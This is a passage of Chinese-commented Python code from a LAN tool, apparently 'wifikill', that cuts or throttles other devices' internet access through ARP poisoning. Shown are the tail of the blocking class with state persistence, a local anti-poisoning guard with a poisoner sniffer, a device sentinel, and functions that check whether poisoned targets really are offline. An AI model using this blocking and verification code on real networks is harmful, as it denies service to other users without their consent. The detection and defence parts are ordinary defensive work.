                # 代际 + 发送锁已保证「停止后不会再发出新的投毒帧」；仍卡住说明 sendp
                # 本身没返回（驱动层异常），如实告知而不是假装干净。
                LOG.emit("warn", "投毒线程未在 3 秒内退出（sendp 未返回，驱动层可能异常）；"
                                 "后续恢复帧仍会排在最后，若目标仍无法上网请再点一次「全部放行」")

    _NET_KEYS = ("iface", "gateway_ip", "gateway_mac")

    def matches_network(self, ni: "NetInfo") -> bool:
        """当前投毒上下文是否仍属于最新扫描到的网络。

        对抗性审查第 5 轮：Killer 持有的是创建时的 NetInfo 快照。换 Wi-Fi / 换路由器后
        若继续沿用旧快照，帧会发向旧网关 MAC —— 界面写着「阻断中」，目标照常上网，
        又是一次静默失效。GUI 每次扫描后用它判定是否需要中止旧阻断。

        「不一致」的判定必须**两侧都非空**：某次扫描探测失败会给出空 iface / 空网关 MAC，
        若把「空 vs 有值」当成换网，就会把正在生效的阻断误杀 —— 这是比漏判更糟的假阳性。
        比对项：网卡、网关 IP、网关 MAC（后者覆盖「同一 IP 换了路由器」）。
        """
        for key in self._NET_KEYS:
            mine = str(getattr(self.ni, key, "") or "").strip().lower()
            cur = str(getattr(ni, key, "") or "").strip().lower()
            if mine and cur and mine != cur:
                return False
        return True

    def abandon(self) -> int:
        """网络已变更：停止投毒并丢弃队列（旧目标不属于新网络，不再回填）。

        不回填是刻意的：向新网络发送旧网关/旧目标的映射帧既救不回顾设备，
        也可能在新网段制造无意义广播。状态文件一并清除，避免下次启动误恢复。
        """
        self.stop()
        with self._lock:
            n = len(self._targets)
            self._targets.clear()
        clear_state()
        if n:
            LOG.emit("warn", f"网络已变更，已停止对旧网络的阻断（{n} 台目标已丢弃）")
        return n

    def persist(self):
        if self.dry_run:
            return          # 演练模式只打印报文，绝不能留下阻断状态
        with self._lock:
            items = [asdict(t) for t in self._targets.values()]
        write_state({
            "updated": time.time(),
            "iface": self.ni.iface,
            "my_mac": self.ni.my_mac,
            "gateway_ip": self.ni.gateway_ip,
            "gateway_mac": self.ni.gateway_mac,
            "targets": items,
        })


# ------------------------------------------------------------------ 本机守护（主动防御）

class Guard:
    """本机主动防御：即使不主动阻断任何设备，也持续守护本机免遭外部 ARP/NDP 投毒。

    原理：周期性核对本地 ARP（以及 IPv6 NDP）缓存中「网关 IP/LLA → MAC」映射，
    是否仍是启动时确认的*真实*网关 MAC。若发现被改写成别的 MAC（典型投毒特征），
    在去抖后记录异常，并重新向本机宣告「网关的真实 MAC」，把被篡改的缓存纠正回来。

    安全不变量（对抗性审查逐条硬化）：
    - 只发送「网关 IP ↔ 真实网关 MAC」这一条*真实*映射，绝不伪造任何第三方地址。
    - 不触碰网关以外的任何 IP/MAC，不向任何第三方投毒。
    - 没有可靠的网关 MAC 基准时绝不发送任何包（避免把错误映射钉死）。
    - IPv6 重宣告一律单播到本机 MAC，绝不发往组播/广播（避免波及整网）。
    - dry_run 仅记录，不发送真实包。
    """

    def __init__(self, ni: "NetInfo", interval: float = 2.0, dry_run: bool = False):
        self.ni = ni
        self.interval = max(1.0, float(interval))
        self.dry_run = dry_run
        self.v6env = None  # 由 GUI 在扫描后注入 ipv6.V6Env（含 gw_lla / my_lla）
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._lock = threading.Lock()
        self._gw_ip = (ni.gateway_ip or "").strip()
        self._gw_mac = ""
        self.last_check = 0.0
        self.anomaly_count = 0
        self.last_anomaly_time = 0.0
        self._consecutive = 0
        self._failed_corr = 0   # 漂移纠正后仍未恢复的连续次数（用于判断基准过时）
        self._last_action = "待命"
        self.event_sink = None  # callable(kind, text, mac, ip) — GUI 注入哨兵事件流
        self._hunting = False   # 投毒者嗅探单飞标志（防线程堆积）
        # IPv6 上下文：(gw_lla, gw_mac, my_lla, iface)
        self._v6: tuple[str, str, str, str] | None = None
        self._v6_counter = 0

    # --- 基准建立 ---

    def _establish_baseline(self, *, strict: bool = False) -> str:
        """确认受信任的网关 MAC：优先用扫描得到的 ni.gateway_mac，否则主动 ARP 询问。

        对抗性加固：若缓存里的网关 MAC 与一次「实时 ARP 询问」返回的 MAC 不一致，
        说明两者有分歧 —— 很可能缓存已被投毒、或本网段真有冲突。此刻不启动发包，
        「fail closed」比「把某个可疑 MAC 钉死」更安全。

        strict=True（重估场景）：必须「缓存有效 且 实时可答 且 两者一致」才返回基准。
        实时询问失败时静默信任缓存只在启动场景可接受（缓存来自刚完成的扫描）；
        重估发生在可疑状态下，单源证据一律拒绝 —— 攻击者改写的缓存不能自证。
        """
        from_cache = (self.ni.gateway_mac or "").lower()
        if _MAC_RE.match(from_cache or ""):
            try:
                live = arp_query(self._gw_ip, self.ni)
            except Exception:
                live = None
            if live and live.lower() != from_cache:
                LOG.emit("warn",
                         f"守护基线分歧：缓存 {from_cache} ≠ 实时询问 {live.lower()}，"
                         f"疑似缓存已被投毒，守护不启动以避免钉死错误映射")
                return ""
            if strict and not live:
                LOG.emit("warn", "守护基准重估：实时询问不可用，单源证据不足，拒绝采纳")
                return ""
            return from_cache
        if strict:
            # strict 模式下没有缓存作对照，实时应答无法自证可信
            LOG.emit("warn", "守护基准重估：缺少扫描缓存对照，拒绝单源采纳")
            return ""
        try:
            got = arp_query(self._gw_ip, self.ni)
            if got:
                return got.lower()
        except Exception as e:
            LOG.emit("debug", f"守护基准探测失败：{e}")
        return ""

    # --- 状态 ---

    def is_active(self) -> bool:
        return self._thread is not None and self._thread.is_alive() and not self._stop.is_set()

    def status(self) -> dict:
        with self._lock:
            return {
                "active": self.is_active(),
                "gw_ip": self._gw_ip,
                "gw_mac": self._gw_mac,
                "last_check": self.last_check,
                "anomaly_count": self.anomaly_count,
                "last_action": self._last_action,
                "v6": self._v6 is not None,
            }

    # --- 生命周期 ---

    def start(self) -> bool:
        if self.is_active():
            return True
        # 防并发：上一次 stop() 后旧线程可能仍在收尾（sendp 未返回等），
        # 必须等它真正退出再开新线程，避免两个守护线程同时 _tick 重复发包。
        old = self._thread
        if old is not None and old.is_alive():
            old.join(timeout=3)
            if old.is_alive():
                LOG.emit("warn", "守护本机：旧守护线程尚未退出，本次不启动（避免并发双线程）")
                return False
        gw_ip = (self.ni.gateway_ip or "").strip()
        if not gw_ip:
            LOG.emit("warn", "守护本机：缺少网关 IP，无法启动")
            return False
        self._gw_ip = gw_ip
        base = self._establish_baseline()
        if not base:
            # 没有可靠基准就不发包：宁可什么都不做，也绝不把错误映射钉死。
            LOG.emit("warn", "守护本机：无法确认网关真实 MAC，不启动发包")
            return False
        with self._lock:
            self._gw_mac = base
            self._v6 = None
            self._consecutive = 0
            self._failed_corr = 0
            self._last_action = "守护中"
        env = self.v6env
        if env is not None and getattr(env, "supported", False) and env.gw_lla \
                and env.gw_mac and getattr(env, "my_lla", ""):
            with self._lock:
                self._v6 = (env.gw_lla, env.gw_mac.lower(), env.my_lla, self.ni.iface)
        code, _ = l2_check()
        if code != "ok":
            LOG.emit("warn", f"守护本机：二层不可用（{code}），仅做监控不发包")
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True,
                                       name="wifikill-guard")
        self._thread.start()
        LOG.emit("ok", f"本机守护已启动：网关 {self._gw_ip} 基准 MAC {self._gw_mac}"
                      + ("（含 IPv6 重宣告）" if self._v6 else ""))
        return True

    def stop(self):
        self._stop.set()
        th = self._thread
        if th is not None and th.is_alive():
            th.join(timeout=3)
        self._thread = None
        with self._lock:
            self._last_action = "已停止"
        LOG.emit("info", "本机守护已停止")

    # --- 主循环 ---

    def _loop(self):
        while not self._stop.is_set():
            try:
                self._tick()
            except Exception as e:
                LOG.emit("warn", f"守护本机异常：{e}")
            self._stop.wait(self.interval)

    def _tick(self):
        now = time.time()
        with self._lock:
            self.last_check = now
            gw_ip = self._gw_ip
            gw_mac = self._gw_mac
            v6 = self._v6
        if not gw_ip or not gw_mac:
            return

        # ---- 网络切换检测：GUI 每次扫描都会把最新 ni 注入 self.ni ----
        cur_gw_ip = (self.ni.gateway_ip or "").strip()
        if cur_gw_ip and cur_gw_ip != gw_ip:
            # 网关 IP 变了（换了 Wi-Fi/网卡/网段）：旧基准整体作废。
            # 新基准仍走「缓存+实时一致才采纳」的完整建立流程。
            with self._lock:
                self._gw_ip = cur_gw_ip
            LOG.emit("warn", f"检测到网关 IP 变化：{gw_ip} → {cur_gw_ip}，重建守护基准")
            self._rebaseline()
            return

        # ---- IPv4 ARP 监控 + 纠正 ----
        table = arp_table()
        cur = (table.get(gw_ip) or "").lower()
        with self._lock:
            if not cur:
                # 缓存缺失与漂移共用去抖：arp_table 偶发解析失败（命令超时返回空表）
                # 不应立即触发全网广播，连续 2 次缺失才重新宣告。
                self._consecutive += 1
                n, missing = self._consecutive, True
            elif cur == gw_mac:
                self._consecutive = 0
                self._failed_corr = 0
                n, missing = 0, False
            else:
                self._consecutive += 1
                n, missing = self._consecutive, False
        if n >= 2:
            if missing:
                LOG.emit("info", f"网关 {gw_ip} 缓存持续缺失，重新宣告真实映射")
                self._reassert("缓存缺失")
            else:
                with self._lock:
                    self.anomaly_count += 1
                    self.last_anomaly_time = now
                    self._failed_corr += 1
                    fc = self._failed_corr
                LOG.emit("warn",
                         f"检测到网关 MAC 漂移：缓存 {cur} ≠ 真实 {gw_mac}，"
                         f"疑似 ARP 投毒，已自动纠正")
                self._reassert("MAC 漂移")
                self._clear_local_arp()   # D1：广播纠正不了本机自身缓存，需删除重建
                self._hunt_poisoner(gw_ip, gw_mac, cur)   # 指认凶手
                if fc >= 3:
                    # 纠正反复不生效：要么攻击者持续投毒，要么基准已过时
                    # （路由器已更换）。重估基准，避免把新真实网关"纠正"回旧 MAC。
                    self._rebaseline()

        self._maybe_v6(v6)

    def refresh_v6(self):
        """扫描后刷新 IPv6 重宣告上下文（守护线程运行中调用）。

        网络切换重估会把 _v6 置空；此后守护线程仍在运行，若无人重新注入，
        IPv6 重宣告将静默失效到下次启停。只在 env 的网关 MAC 与当前 IPv4
        基准**一致**时采纳 —— 不一致说明上下文与基准不同源，宁可不用。
        """
        if not self.is_active():
            return
        env = self.v6env
        if env is None or not getattr(env, "supported", False):
            return
        gw_lla, gw_mac, my_lla = env.gw_lla, env.gw_mac, getattr(env, "my_lla", "")
        if not (gw_lla and gw_mac and my_lla):
            return
        with self._lock:
            if gw_mac.lower() != self._gw_mac:
                LOG.emit("debug", "守护 IPv6 上下文与基准 MAC 不一致，暂不启用重宣告")
                return
            self._v6 = (gw_lla, gw_mac.lower(), my_lla, self.ni.iface)

    # --- 本机缓存自愈（真机审查 D1）---

    def _hunt_poisoner(self, gw_ip: str, gw_mac: str, poison_mac: str):
        """漂移确认后启动短嗅探，尝试指认投毒者的真实 MAC（单飞，不堆积线程）。"""
        if self._hunting or self.dry_run:
            return
        self._hunting = True

        def work():
            try:
                killer_mac = sniff_poisoner(self.ni, gw_ip, gw_mac, seconds=4.0)
                if killer_mac and self.event_sink:
                    # 对抗性审查 F2：以太网源 MAC 可被攻击者伪造（冒用无辜设备），
                    # 指认结论必须带"疑似/供参考"限定，不能写成定罪式断言。
                    self.event_sink(
                        "poison", f"疑似投毒者：{killer_mac}"
                                  f"（曾冒称网关 {gw_ip}；MAC 可伪造，供参考）",
                        mac=killer_mac, ip=gw_ip,
                        notify_key=f"poison:{killer_mac}",
                        notify_title="ARP 投毒已拦截",
                        notify_msg=f"疑似攻击者 {killer_mac} 冒称网关"
                                   f"（MAC 可伪造，供参考），已自动纠正")
                elif self.event_sink:
                    self.event_sink(
                        "poison", "检测到网关映射漂移并已纠正，但未能定位投毒者"
                                  "（攻击已停止或无法观测）",
                        ip=gw_ip, notify_key="poison:unknown")
            except Exception as e:
                LOG.emit("debug", f"投毒者指认失败：{e}")
            finally:
                self._hunting = False
        threading.Thread(target=work, daemon=True, name="wifikill-hunt").start()

    def _clear_local_arp(self):
        """删除本机 ARP 缓存里的网关条目，迫使系统重新询问真实网关。

        真机审查发现的设计盲点：广播免费 ARP 不会回环到本机协议栈
        （网卡不会把自发自收的帧上交），它只能纠正**其他设备**的缓存；
        本机自己被投毒的条目必须靠「删除 → 重新解析（真实网关应答）」自愈。
        `arp -d` 无需管理员权限（真机实测 rc=0）；攻击者若抢答，下一拍
        监测会再次发现漂移并再次清除，形成持续对抗。
        """
        if self.dry_run:
            LOG.emit("debug", "[演练] 跳过删除本机 ARP 条目")
            return
        try:
            _run_hidden(["arp", "-d", self._gw_ip], "gbk")
            LOG.emit("debug",
                     f"已删除本机 ARP 缓存的网关条目（{self._gw_ip}），等待真实网关应答重建")
        except Exception as e:
            LOG.emit("debug", f"删除本机 ARP 条目失败：{e}")

    def _clear_local_neighbor(self, gw_lla: str, iface: str):
        """删除本机 IPv6 邻居缓存里的网关条目（best-effort）。

        同 D1：单播 NA 同样不会回环到本机栈。netsh 需要管理员提权
        （真机实测非提权返回「需要提升」）；打包 exe 以 UAC 管理员运行时
        可用，权限不足时静默跳过 —— v6 防御本就 best-effort，由周期重宣告兜底。
        """
        if self.dry_run:
            LOG.emit("debug", "[演练] 跳过删除本机 IPv6 邻居条目")
            return
        try:
            name = (friendly_iface(iface) or "").split(" · ")[0].strip()
            out = _run_hidden(
                ["netsh", "interface", "ipv6", "show", "interfaces"], "gbk") or ""
            idx = ""
            for line in out.splitlines():
                if name and name in line:
                    parts = line.split()
                    if parts and parts[0].isdigit():
                        idx = parts[0]
                        break
            if not idx:
                return
            _run_hidden(
                ["netsh", "interface", "ipv6", "delete", "neighbors",
                 f"interface={idx}", f"address={gw_lla.split('%')[0]}"], "gbk")
            LOG.emit("debug", f"已删除本机 IPv6 邻居缓存的网关条目（{gw_lla}）")
        except Exception as e:
            LOG.emit("debug", f"删除本机 IPv6 邻居条目失败：{e}")

    def _rebaseline(self):
        """重估守护基准（网络切换 / 纠正反复不生效时调用）。

        对抗性设计：绝不因「单次实时询问与基准不同」就采纳新 MAC ——
        实时询问本身可能被攻击者抢答毒化，采纳等于自伤。
        仍沿用启动时的完整流程：缓存与实时**一致**才采纳；
        分歧或不可达一律 fail closed（暂停纠正），并明确告知用户。
        """
        LOG.emit("warn", "守护：正在重估基准（网络切换或纠正反复不生效）…")
        base = self._establish_baseline(strict=True)
        with self._lock:
            self._failed_corr = 0
            if base and base != self._gw_mac:
                self._gw_mac = base
                self._consecutive = 0
                self._v6 = None   # 旧 IPv6 上下文属于旧网络，作废待扫描重注入
                self._last_action = f"基准已更新：{self._gw_ip} → {base}"
                LOG.emit("ok", f"守护基准已更新：网关 {self._gw_ip} → {base}")
            elif not base:
                self._gw_mac = ""
                self._v6 = None
                self._last_action = "基准重估失败，暂停纠正（fail closed）"
                LOG.emit("warn",
                         "守护基准重估失败（缓存/实时分歧或不可达），"
                         "暂停发包避免钉死错误映射（fail closed）")
            else:
                self._consecutive = 0
                self._last_action = "基准复核一致，继续守护"

    def _maybe_v6(self, v6):
        """IPv6 重宣告 + best-effort 监控，约每 10 秒一次（避免过于频繁）。"""
        if not v6:
            return
        self._v6_counter += 1
        every = max(1, round(10.0 / self.interval))
        if self._v6_counter % every != 0:
            return
        gw_lla, gw_mac, my_lla, iface = v6
        try:
            import ipv6 as _v6mod
            # best-effort 监控：本机 NDP 缓存里网关 LLA 的 MAC 是否被改
            # （ndp_table 返回的 key 一律为小写去 zone，比对前先归一化）
            tbl = _v6mod.ndp_table()
            key = gw_lla.split("%")[0].lower()
            cur = (tbl.get(key) or "").lower()
            if cur and cur != gw_mac.lower():
                LOG.emit("warn",
                         f"检测到网关 IPv6 映射漂移：{gw_lla} 缓存 {cur} ≠ 真实 {gw_mac}，"
                         f"疑似 NDP 投毒，已自动纠正")
                with self._lock:
                    self.anomaly_count += 1
                    self.last_anomaly_time = time.time()
                self._clear_local_neighbor(gw_lla, iface)   # D1：单播 NA 到不了本机栈
            # 重宣告真实映射：L3 源是网关 LLA（属实），L2 源用本机 MAC（不冒充网关）
            na = _v6mod.build_na(
                eth_src=self.ni.my_mac, eth_dst=self.ni.my_mac,
                ipv6_src=gw_lla, ipv6_dst=my_lla,
                tgt=gw_lla, lladdr=gw_mac, solicited=0)
            self._send_v6(na)
        except Exception as e:
            LOG.emit("debug", f"IPv6 守护处理失败：{e}")

    # --- 发包（仅真实网关映射）---

    def _reassert(self, reason: str):
        """向全网重新宣告网关的真实 MAC，把被篡改的缓存纠正回来。"""
        code, _ = l2_check()
        if code != "ok":
            with self._lock:
                self._last_action = f"[{reason}] 二层不可用，跳过发包"
            return
        s = scapy_mod()
        if s is None:
            return
        my_mac = (self.ni.my_mac or "").lower()
        if not _MAC_RE.match(my_mac) or not _MAC_RE.match(self._gw_mac):
            with self._lock:
                self._last_action = f"[{reason}] MAC 无效，跳过"
            return
        # 免费 ARP：向全网宣告「网关 IP 的真实 MAC」（仅这条真实映射）。
        # 注意：L2 源用「本机 MAC」而非网关 MAC —— 我们只是纠正缓存，
        # 不冒充网关在二层出现，避免触发交换机端口安全/MAC 翻动告警。
        pkt = (s.Ether(dst=BROADCAST, src=my_mac) /
               s.ARP(op=2, hwsrc=self._gw_mac, psrc=self._gw_ip,
                     hwdst=my_mac, pdst=self._gw_ip))
        if self.dry_run:
            with self._lock:
                self._last_action = f"[演练] 宣告 {self._gw_ip} → {self._gw_mac}（{reason}）"
            LOG.emit("debug",
                     f"[演练] 守护宣告：{self._gw_ip} 的真实 MAC 是 {self._gw_mac}（{reason}）")
            return
        try:
            s.sendp(pkt, iface=self.ni.iface, verbose=0, count=2)
            with self._lock:
                self._last_action = f"纠正：{self._gw_ip} → {self._gw_mac}（{reason}）"
            LOG.emit("ok", f"已重新宣告网关真实 MAC，纠正缓存（{reason}）")
        except Exception as e:
            LOG.emit("warn", f"守护宣告失败：{e}")

    def _send_v6(self, pkt):
        code, _ = l2_check()
        if code != "ok":
            return
        s = scapy_mod()
        if s is None:
            return
        if self.dry_run:
            LOG.emit("debug", "[演练] 守护 IPv6 重宣告（网关真实映射）")
            return
        try:
            s.sendp(pkt, iface=self.ni.iface, verbose=0, count=1)
        except Exception as e:
            LOG.emit("debug", f"守护 IPv6 发送失败：{e}")


# ------------------------------------------------------------------ 全网哨兵

SENTINEL_FILE = APP_DIR / "sentinel.json"
SENTINEL_MAX_EVENTS = 200
# 基线上限（第 11 轮探针）：开启「私有 Wi-Fi 地址」的设备每次接入都可能换 MAC，
# 没有上限时 sentinel.json 与待认领列表会无限增长。
SENTINEL_MAX_KNOWN = 2000
NOTIFY_DEDUP_SECONDS = 300.0   # 同一事件 5 分钟内只弹一次通知


class Sentinel:
    """全网 ARP 哨兵：设备基线库 + 新设备告警 + 事件流。

    与 Guard 的分工：Guard 管「网关映射防御」，Sentinel 管「全楼名册」。
    - 基线半自动：首次运行把扫描到的全部设备静默入册（视为现任住户），
      之后新出现的 MAC 产生「new」事件，人工 claim 认领 / forget 移出。
    - notify 回调由 GUI 注入（托盘气泡）；未注入时只记 LOG，无头环境安全。
    - 同一事件（按 key）5 分钟内只弹一次通知，防止持续攻击轰炸。
    """

    def __init__(self, notify=None):
        self.notify = notify or (lambda title, msg: None)
        self._lock = threading.Lock()
        self._known: dict[str, dict] = {}   # mac.lower() -> {ip, name, known, first}
        self.events: list[dict] = []
        self._last_notify: dict[str, float] = {}
        self.load()

    # --- 持久化 ---

    def load(self):
        try:
            if SENTINEL_FILE.exists():
                data = json.loads(SENTINEL_FILE.read_text(encoding="utf-8"))
                # 对抗性审查第 5 轮：损坏/手改过的基线（known 写成 list、events 写成
                # 字符串）此前会被原样收下，随后每次扫描在 feed_scan 里炸 AttributeError。
                known = data.get("known")
                events = data.get("events")
                self._known = ({k: v for k, v in known.items()
                                if isinstance(k, str) and isinstance(v, dict)}
                               if isinstance(known, dict) else {})
                self.events = [e for e in events if isinstance(e, dict)] \
                    if isinstance(events, list) else []
                if not isinstance(known, dict) or not isinstance(events, list):
                    LOG.emit("warn", "哨兵基线格式异常，已按空基线重建")
        except Exception as e:
            LOG.emit("debug", f"哨兵基线读取失败（按空基线处理）：{e}")
            self._known, self.events = {}, []

    def save(self):
        try:
            with self._lock:
                data = {"known": self._known, "events": self.events}
            tmp = SENTINEL_FILE.with_suffix(".tmp")
            tmp.write_text(json.dumps(data, ensure_ascii=False, indent=1),
                           encoding="utf-8")
            os.replace(tmp, SENTINEL_FILE)
        except Exception as e:
            LOG.emit("debug", f"哨兵基线写入失败：{e}")

    # --- 扫描喂入 ---

    def feed_scan(self, devices) -> list[dict]:
        """喂入扫描结果。返回本次「新发现（未入册）」设备；首次运行静默建立基线。"""
        new: list[dict] = []
        first_run = False
        with self._lock:
            first_run = not self._known
            for d in devices:
                mac = (getattr(d, "mac", "") or "").lower()
                if not _MAC_RE.match(mac):
                    continue
                rec = self._known.get(mac)
                if rec is None:
                    pending = not first_run
                    self._known[mac] = {"ip": getattr(d, "ip", "") or "",
                                        "name": getattr(d, "note", "") or "",
                                        "known": not pending,
                                        "first": time.time()}
                    if pending:
                        self._add_event("new", mac, d.ip, f"发现新设备 {d.ip}")
                        new.append({"mac": mac, "ip": getattr(d, "ip", "")})
                else:
                    if getattr(d, "ip", ""):
                        rec["ip"] = d.ip
        evicted = self._trim()
        if evicted:
            LOG.emit("warn", f"哨兵基线已达上限（{SENTINEL_MAX_KNOWN}），"
                     f"已自动移出 {evicted} 台最早出现且未认领的设备")
        for n in new:
            self._notify_dedup(f"new:{n['mac']}", "发现新设备",
                               f"{n['ip']} 首次接入网络，已记入哨兵待认领")
        self.save()
        return new

    def _trim(self) -> int:
        """基线超过上限时淘汰：**未认领优先**，同组内按首次出现时间从早到晚。

        为什么不直接砍最早的：已被用户「认领」的是现任住户，应当优先保留；
        未认领的往往是随机 MAC 的过客，先淘汰它们对用户最友好。
        """
        over = len(self._known) - SENTINEL_MAX_KNOWN
        if over <= 0:
            return 0
        victims = sorted(self._known.items(),
                         key=lambda kv: (bool(kv[1].get("known")),
                                         float(kv[1].get("first") or 0.0)))
        with self._lock:
            for mac, rec in victims[:over]:
                self._known.pop(mac, None)
                self._add_event("forget", mac, rec.get("ip", ""),
                                "基线超限：已自动移出最早未认领的设备")
        return over

    # --- 认领 / 移出 ---

    def claim(self, mac: str) -> bool:
        mac = (mac or "").lower()
        with self._lock:
            rec = self._known.get(mac)
            if not rec:
                return False
            rec["known"] = True
        self._add_event("claim", mac, rec.get("ip", ""), "设备已认领入基线")
        self.save()
        return True

    def forget(self, mac: str) -> bool:
        """移出基线：该设备下次出现会重新告警。"""
        mac = (mac or "").lower()
        with self._lock:
            rec = self._known.pop(mac, None)
        if not rec:
            return False
        self._add_event("forget", mac, rec.get("ip", ""), "设备已移出基线")
        self.save()
        return True

    def pending(self) -> list[dict]:
        """未认领（known=False）的设备列表。"""
        with self._lock:
            return [{"mac": m, **rec} for m, rec in self._known.items()
                    if not rec.get("known")]

    # --- 事件流（Guard / GUI 均可投喂）---

    def feed_event(self, kind: str, text: str, mac: str = "", ip: str = "",
                   notify_key: str = "", notify_title: str = "",
                   notify_msg: str = ""):
        """记录一条事件；可选弹通知（notify_key 相同的 5 分钟内只弹一次）。"""
        with self._lock:
            self._add_event(kind, mac, ip, text)
        self.save()
        if notify_key:
            self._notify_dedup(notify_key, notify_title or kind, notify_msg or text)

    # --- 内部 ---

    def _add_event(self, kind: str, mac: str, ip: str, text: str) -> dict:
        ev = {"t": time.time(), "kind": kind, "mac": mac, "ip": ip, "text": text}
        self.events.append(ev)
        if len(self.events) > SENTINEL_MAX_EVENTS:
            self.events = self.events[-SENTINEL_MAX_EVENTS:]
        LOG.emit("info", f"[哨兵] {text}")
        return ev

    def _notify_dedup(self, key: str, title: str, msg: str):
        now = time.time()
        with self._lock:
            last = self._last_notify.get(key, 0.0)
            if now - last < NOTIFY_DEDUP_SECONDS:
                return
            self._last_notify[key] = now
        LOG.emit("warn", f"[哨兵] {title}：{msg}")
        try:
            self.notify(title, msg)
        except Exception:
            pass


def sniff_poisoner(ni: "NetInfo", gw_ip: str, gw_mac: str,
                   seconds: float = 4.0) -> str:
    """短嗅探定位 ARP 投毒者。

    抓取「声称自己是网关 IP、但硬件地址 ≠ 真实网关 MAC」的帧，返回其以太网
    源 MAC（凶手脸）。抓不到（攻击已停 / 权限不足 / 客户端隔离）返回空串，
    由调用方如实记录「未能定位」。
    """
    s = scapy_mod()
    if s is None:
        return ""
    try:
        from scapy.layers.l2 import ARP, Ether
        target = (gw_mac or "").lower()
        pkts = s.sniff(
            iface=ni.iface, timeout=seconds, store=True,
            lfilter=lambda p: (p.haslayer(ARP) and p.haslayer(Ether)
                               and (p[ARP].psrc or "") == gw_ip
                               and p[ARP].hwsrc
                               and p[ARP].hwsrc.lower() != target
                               and p[Ether].src.lower() != target))
        for p in pkts:
            return p[Ether].src.lower()
    except Exception as e:
        LOG.emit("debug", f"投毒者嗅探失败：{e}")
    return ""


# ---------------------------------------------------------------- 阻断验证


def classify_target_frames(target_mac: str, my_mac: str, gw_mac: str, frames) -> dict:
    """把抓到的帧归类（纯函数）：吸到本机 = 投毒生效；仍发往真实网关 = 泄漏。

    判据来源：ARP 双向投毒生效后，目标发给网关的帧二层目的地址会变成**本机 MAC**，
    这些帧会真的送到我们网卡上——嗅探里能看见；反之若仍看到「目标 → 真实网关 MAC」
    的帧，说明目标缓存还是真实映射（投毒没生效或被回填）。
    """
    t = (target_mac or "").lower()
    me = (my_mac or "").lower()
    gw = (gw_mac or "").lower()
    hits = leaks = other = 0
    for src, dst in frames:
        if src != t:
            continue
        if dst == me:
            hits += 1
        elif dst == gw:
            leaks += 1
        else:
            other += 1
    return {"hits": hits, "leaks": leaks, "other": other}


def verification_verdict(hits: int, leaks: int, duty: int = 100) -> tuple[str, str]:
    """把计数翻译成一句用户能看懂的话（纯函数，便于单测）。

    对抗性审查第 10 轮：限速目标存在「恢复拍」——那几拍我们主动告诉目标真实网关 MAC，
    它当然会直连真实网关。照旧判「部分生效」的话，每一台限速设备都会被误报成半失效。
    因此 duty<100 时用单独判定，把间歇放行解释成预期行为。
    """
    if 0 < int(duty or 100) < 100:
        if hits:
            return ("throttled",
                    f"限速中（{int(duty)}%）：已生效，直连真实网关的帧属于放行拍，属预期")
        if leaks:
            return ("unknown", f"限速中（{int(duty)}%）：窗口内只见到放行拍的帧，建议再验一次")
        return ("unknown", f"限速中（{int(duty)}%）：窗口内没抓到该目标的帧，无法判定")
    if hits and not leaks:
        return "ok", "已生效：目标的出站帧正被打到本机（它上不了网）"
    if hits and leaks:
        return "partial", "部分生效：仍有帧直接发给真实网关（目标可能在回填缓存）"
    if leaks:
        return "fail", "未生效：目标仍直连真实网关"
    return "unknown", "无法判定：窗口内没抓到该目标的帧（设备可能空闲）"


def sniff_target_frames(ni: "NetInfo", macs: set[str], seconds: float = 4.0):
    """嗅探若干目标 MAC 发出的帧，返回 [(src_mac, dst_mac)]（只读，不发包）。"""
    s = scapy_mod()
    if s is None or not macs:
        return []
    from scapy.layers.l2 import Ether
    out: list[tuple[str, str]] = []
    try:
        pkts = s.sniff(iface=ni.iface, timeout=max(0.5, float(seconds)), store=True,
                       lfilter=lambda p: p.haslayer(Ether)
                       and (p[Ether].src or "").lower() in macs)
        out = [(p[Ether].src.lower(), p[Ether].dst.lower()) for p in pkts]
    except Exception as e:
        LOG.emit("debug", f"阻断验证嗅探失败：{e}")
    return out


def verify_targets(ni: "NetInfo", targets, seconds: float = 4.0) -> dict[str, dict]:
    """逐个验证「这些目标是不是真的断了网」。

    只做被动观测：嗅探 `seconds` 秒，看每个目标的出站帧到底发给了谁。
    不额外发包（投毒帧由运行中的会话按 interval 正常发送）。
    """
    macs = {(getattr(t, "mac", "") or "").lower() for t in targets}
    macs.discard("")
    frames = sniff_target_frames(ni, macs, seconds)
    out: dict[str, dict] = {}
    for t in targets:
        st = classify_target_frames(getattr(t, "mac", ""), ni.my_mac, ni.gateway_mac, frames)
        duty = int(getattr(t, "duty", 100) or 100)
        code, text = verification_verdict(st["hits"], st["leaks"], duty)
        out[t.ip] = {"status": code, "text": text, **st}
    return out


# ------------------------------------------------------------------ 单实例锁



class SingleInstance:
    """用本地端口做互斥，避免两个实例互相覆盖状态文件。"""

    def __init__(self, port: int = LOCK_PORT):
        self.port = port
        self.sock: socket.socket | None = None

    def acquire(self) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if WINDOWS:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_EXCLUSIVEADDRUSE, 1)
            else:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
            s.bind(("127.0.0.1", self.port))
            s.listen(1)
            self.sock = s
            return True
        except OSError:
            return False

    def release(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None
